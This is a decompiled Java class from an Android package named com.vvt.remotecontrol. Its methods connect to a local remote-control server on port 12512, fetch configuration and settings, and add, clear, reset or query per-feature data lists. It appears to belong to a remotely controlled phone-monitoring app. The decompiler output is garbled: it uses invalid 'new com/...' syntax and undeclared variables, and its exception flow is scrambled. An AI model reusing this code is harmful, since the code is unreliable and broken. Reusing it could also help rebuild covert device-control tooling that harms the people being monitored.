package com.vvt.remotecontrol;

import com.fx.socket.command.RemoteCheckTcpServerAvailable;
import com.vvt.base.FeatureId;
import com.vvt.remotecontrol.command.RemoteGetRmtCtrl;
import com.vvt.remotecontrol.input.RmtCtrlInputManageCommonData;
import com.vvt.remotecontrol.input.RmtCtrlInputManageCommonData.Operation;
import com.vvt.remotecontrol.output.RmtCtrlOutputConfiguration;
import com.vvt.remotecontrol.output.RmtCtrlOutputResultSet;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static a a()
  {
    bool1 = false;
    Object localObject1 = null;
    bool2 = false;
    localObject2 = null;
    try
    {
      Object localObject3 = new com/fx/socket/command/RemoteCheckTcpServerAvailable;
      String str = "com.vvt.rmtctrl.server";
      int i = 12512;
      ((RemoteCheckTcpServerAvailable)localObject3).<init>(str, i);
      localObject3 = ((RemoteCheckTcpServerAvailable)localObject3).execute();
      localObject3 = (Boolean)localObject3;
      bool2 = ((Boolean)localObject3).booleanValue();
      return (a)localObject2;
    }
    catch (IOException localIOException2)
    {
      for (;;)
      {
        try
        {
          bool3 = a;
          if ((bool3) && (!bool2)) {
            continue;
          }
          localObject3 = new com/vvt/remotecontrol/command/RemoteGetRmtCtrl;
          ((RemoteGetRmtCtrl)localObject3).<init>();
          localObject3 = ((RemoteGetRmtCtrl)localObject3).execute();
          localObject3 = (a)localObject3;
        }
        catch (IOException localIOException3)
        {
          boolean bool4 = bool2;
          bool2 = false;
          localObject2 = null;
          bool1 = bool4;
          continue;
          boolean bool3 = false;
          IOException localIOException4 = null;
          continue;
        }
        try
        {
          bool2 = b;
          if (bool2) {}
          localObject2 = localObject3;
          bool3 = false;
          localObject3 = null;
          if ((localObject3 == null) && (localObject2 != null)) {
            continue;
          }
          localObject3 = new com/vvt/remotecontrol/RemoteControlException;
          ((RemoteControlException)localObject3).<init>("AppEngine1 not available.");
          throw ((Throwable)localObject3);
        }
        catch (IOException localIOException1)
        {
          bool1 = bool2;
          localObject2 = localIOException3;
          localIOException4 = localIOException1;
          continue;
        }
        localIOException2 = localIOException2;
        bool4 = false;
        bool2 = false;
        localObject2 = null;
        bool1 = false;
        localObject1 = null;
        if (bool1)
        {
          bool1 = c;
          if (!bool1) {}
        }
        else
        {
          bool1 = a;
          if (!bool1) {}
        }
      }
    }
  }
  
  public static List a(a parama)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.GET_CONFIGURATION;
    ((ControlCommand)localObject).<init>(localRemoteFunction, null);
    localObject = parama.execute((ControlCommand)localObject);
    boolean bool = localObject instanceof RmtCtrlOutputConfiguration;
    if (bool)
    {
      localObject = ((RmtCtrlOutputConfiguration)localObject).getSupportedFeatures();
      localArrayList.addAll((Collection)localObject);
    }
    return localArrayList;
  }
  
  public static void a(a parama, FeatureId paramFeatureId)
  {
    RmtCtrlInputManageCommonData.Operation localOperation = RmtCtrlInputManageCommonData.Operation.CLEAR;
    a(parama, paramFeatureId, localOperation, null);
  }
  
  private static void a(a parama, FeatureId paramFeatureId, RmtCtrlInputManageCommonData.Operation paramOperation, List paramList)
  {
    Object localObject = new com/vvt/remotecontrol/input/RmtCtrlInputManageCommonData;
    ((RmtCtrlInputManageCommonData)localObject).<init>();
    ((RmtCtrlInputManageCommonData)localObject).setFeatureId(paramFeatureId);
    ((RmtCtrlInputManageCommonData)localObject).setOperation(paramOperation);
    if (paramList != null) {
      ((RmtCtrlInputManageCommonData)localObject).setList(paramList);
    }
    ControlCommand localControlCommand = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.MANAGE_COMMON_DATA;
    localControlCommand.<init>(localRemoteFunction, localObject);
    localObject = parama.execute(localControlCommand);
    boolean bool = localObject instanceof RemoteControlException;
    if (bool) {
      throw ((RemoteControlException)localObject);
    }
  }
  
  public static void a(a parama, FeatureId paramFeatureId, List paramList)
  {
    RmtCtrlInputManageCommonData.Operation localOperation = RmtCtrlInputManageCommonData.Operation.ADD;
    a(parama, paramFeatureId, localOperation, paramList);
  }
  
  public static RmtCtrlOutputSettings b(a parama)
  {
    Object localObject3;
    try
    {
      Object localObject1 = new com/vvt/remotecontrol/ControlCommand;
      localObject3 = RemoteFunction.GET_SETTINGS;
      ((ControlCommand)localObject1).<init>((RemoteFunction)localObject3, null);
      localObject1 = parama.execute((ControlCommand)localObject1);
      boolean bool = localObject1 instanceof RmtCtrlOutputSettings;
      if (bool) {
        return (RmtCtrlOutputSettings)localObject1;
      }
      localObject1 = new com/vvt/remotecontrol/RemoteControlException;
      localObject3 = "Settings can't be retrieved at the moment.";
      ((RemoteControlException)localObject1).<init>((String)localObject3);
      throw ((Throwable)localObject1);
    }
    finally
    {
      localObject3 = new com/vvt/remotecontrol/RemoteControlException;
      String str = ((Throwable)localObject2).getMessage();
      ((RemoteControlException)localObject3).<init>(str);
    }
  }
  
  public static List b(a parama, FeatureId paramFeatureId)
  {
    Object localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputManageCommonData;
    ((RmtCtrlInputManageCommonData)localObject1).<init>();
    ((RmtCtrlInputManageCommonData)localObject1).setFeatureId(paramFeatureId);
    Object localObject2 = RmtCtrlInputManageCommonData.Operation.QUERY;
    ((RmtCtrlInputManageCommonData)localObject1).setOperation((RmtCtrlInputManageCommonData.Operation)localObject2);
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject3 = RemoteFunction.MANAGE_COMMON_DATA;
    ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
    localObject3 = new java/util/ArrayList;
    ((ArrayList)localObject3).<init>();
    localObject1 = parama.execute((ControlCommand)localObject2);
    boolean bool = localObject1 instanceof RmtCtrlOutputResultSet;
    if (bool)
    {
      localObject1 = ((RmtCtrlOutputResultSet)localObject1).getResultSet();
      ((List)localObject3).addAll((Collection)localObject1);
    }
    do
    {
      return (List)localObject3;
      bool = localObject1 instanceof RemoteControlException;
    } while (!bool);
    throw ((RemoteControlException)localObject1);
  }
  
  public static void b(a parama, FeatureId paramFeatureId, List paramList)
  {
    RmtCtrlInputManageCommonData.Operation localOperation = RmtCtrlInputManageCommonData.Operation.RESET;
    a(parama, paramFeatureId, localOperation, paramList);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */